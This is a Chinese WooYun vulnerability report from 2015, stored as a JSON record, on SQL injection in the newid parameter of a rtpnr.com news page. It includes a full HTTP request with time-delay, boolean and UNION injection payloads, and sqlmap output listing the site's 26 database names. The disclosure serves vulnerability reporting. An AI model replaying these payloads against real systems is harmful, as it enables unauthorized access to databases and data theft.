{"id": 31666, "wybug_id": "wooyun-2015-0113444", "wybug_title": "北京中航易购某处sql注入", "wybug_corp": "rtpnr.com", "wybug_author": "depycode", "wybug_date": "2015-05-11 16:02", "wybug_open_date": "2015-06-25 19:08", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-25：\t细节向公众公开  简要描述： RT.. 详细说明：  \nPOST /NewEdition/YeeGoNews/NewsDetail.aspx HTTP/1.1Host: www.rtpnr.comProxy-Connection: keep-aliveContent-Length: 38Accept: application/json, text/javascript, */*; q=0.01Origin: http://www.rtpnr.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://www.rtpnr.com/NewEdition/YeeGoNews/NewsDetail.aspx?Type=NewsDetails&newid=1231%27;waitfor%20delay%20%270:0:5%27--Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: ASP.NET_SessionId=tmmobsqew2uk3h55r31wng3m; Hm_lvt_6a6eed5fb68938503f53da6222456e44=1431329622; Hm_lpvt_6a6eed5fb68938503f53da6222456e44=1431329881; CheckCode=6014Type=GetDetails&newid=1231\nnewid 存在sql注入。\n' and '1'='1\n\n\n\n' and '1'='2\n\n\n数据库\nsqlmap identified the following injection points with a total of 40 HTTP(s) requests:---Parameter: newid (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: Type=GetDetails&newid=1231' AND 5264=5264 AND 'lEnQ'='lEnQ    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: Type=GetDetails&newid=1231';WAITFOR DELAY '0:0:5'--    Type: UNION query    Title: Generic UNION query (NULL) - 18 columns    Payload: Type=GetDetails&newid=1231' UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(106)+CHAR(118)+CHAR(120)+CHAR(113)+CHAR(81)+CHAR(105)+CHAR(106)+CHAR(90)+CHAR(90)+CHAR(74)+CHAR(117)+CHAR(102)+CHAR(111)+CHAR(97)+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(106)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-----[15:44:43] [INFO] testing Microsoft SQL Server[15:44:43] [INFO] confirming Microsoft SQL Server[15:44:44] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: Microsoft IIS 7.5, ASP.NET, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008[15:44:44] [INFO] fetching database namesavailable databases [26]:[*] AutoTicket[*] BACKUP[*] distribution[*] master[*] model[*] MonitorBlocking[*] msdb[*] Temp2015[*] tempdb[*] tslwp[*] YeeGo_BackUp[*] YeeGo_History[*] YeeGo_Order[*] YeeGoCopy[*] YeeGoLog[*] YeeGoTemp[*] YeeGoUser[*] YeeSkyBillings[*] YeeSkyGo[*] YeeSkyGo_TEST[*] YeeSkyGoLog[*] YeeSkyGoLog_History[*] Yeesoho_test[*] YSK_SAAS[*] YSK_SAAS_History[*] YSK_SAAS_TEST[15:44:45] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 17 times\n   漏洞证明：  \nsqlmap identified the following injection points with a total of 40 HTTP(s) requests:---Parameter: newid (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: Type=GetDetails&newid=1231' AND 5264=5264 AND 'lEnQ'='lEnQ    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: Type=GetDetails&newid=1231';WAITFOR DELAY '0:0:5'--    Type: UNION query    Title: Generic UNION query (NULL) - 18 columns    Payload: Type=GetDetails&newid=1231' UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(106)+CHAR(118)+CHAR(120)+CHAR(113)+CHAR(81)+CHAR(105)+CHAR(106)+CHAR(90)+CHAR(90)+CHAR(74)+CHAR(117)+CHAR(102)+CHAR(111)+CHAR(97)+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(106)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-----[15:44:43] [INFO] testing Microsoft SQL Server[15:44:43] [INFO] confirming Microsoft SQL Server[15:44:44] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: Microsoft IIS 7.5, ASP.NET, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008[15:44:44] [INFO] fetching database namesavailable databases [26]:[*] AutoTicket[*] BACKUP[*] distribution[*] master[*] model[*] MonitorBlocking[*] msdb[*] Temp2015[*] tempdb[*] tslwp[*] YeeGo_BackUp[*] YeeGo_History[*] YeeGo_Order[*] YeeGoCopy[*] YeeGoLog[*] YeeGoTemp[*] YeeGoUser[*] YeeSkyBillings[*] YeeSkyGo[*] YeeSkyGo_TEST[*] YeeSkyGoLog[*] YeeSkyGoLog_History[*] Yeesoho_test[*] YSK_SAAS[*] YSK_SAAS_History[*] YSK_SAAS_TEST[15:44:45] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 17 times\n   修复方案：  过滤   版权声明：转载请注明来源 depycode@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-05-11 19:07 厂商回复： 感谢反馈！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-22 15:58 |    \t\tEvil卍 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:6        )\t\t \n  牛儿，这属于http注入？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}